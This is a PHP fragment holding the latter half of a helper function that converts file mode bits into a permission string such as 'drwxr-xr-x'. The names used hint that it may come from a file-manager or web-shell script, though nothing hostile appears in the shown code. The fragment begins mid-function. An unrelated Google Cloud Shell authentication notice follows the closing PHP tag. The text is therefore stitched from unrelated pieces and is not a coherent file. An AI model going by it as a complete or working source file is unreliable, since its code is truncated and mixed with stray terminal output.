$ingfo = 'd';
} elseif (($statusnya & 0x2000) == 0x2000) {
// Character special
$ingfo = 'c';
} elseif (($statusnya & 0x1000) == 0x1000) {
// FIFO pipe
$ingfo = 'p';
} else {
// Unknown
$ingfo = 'u';
}

// Owner
$ingfo .= (($statusnya & 0x0100) ? 'r' : '-');
$ingfo .= (($statusnya & 0x0080) ? 'w' : '-');
$ingfo .= (($statusnya & 0x0040) ?
(($statusnya & 0x0800) ? 's' : 'x' ) :
(($statusnya & 0x0800) ? 'S' : '-'));


// Group
$ingfo .= (($statusnya & 0x0020) ? 'r' : '-');
$ingfo .= (($statusnya & 0x0010) ? 'w' : '-');
$ingfo .= (($statusnya & 0x0008) ?
(($statusnya & 0x0400) ? 's' : 'x' ) :
(($statusnya & 0x0400) ? 'S' : '-'));

// World
$ingfo .= (($statusnya & 0x0004) ? 'r' : '-');
$ingfo .= (($statusnya & 0x0002) ? 'w' : '-');

$ingfo .= (($statusnya & 0x0001) ?
(($statusnya & 0x0200) ? 't' : 'x' ) :
(($statusnya & 0x0200) ? 'T' : '-'));

return $ingfo;
}
?>
Automatic authentication with GCP CLI tools in Cloud Shell is disabled. To enable, please rerun command with `--authorize-session` flag.
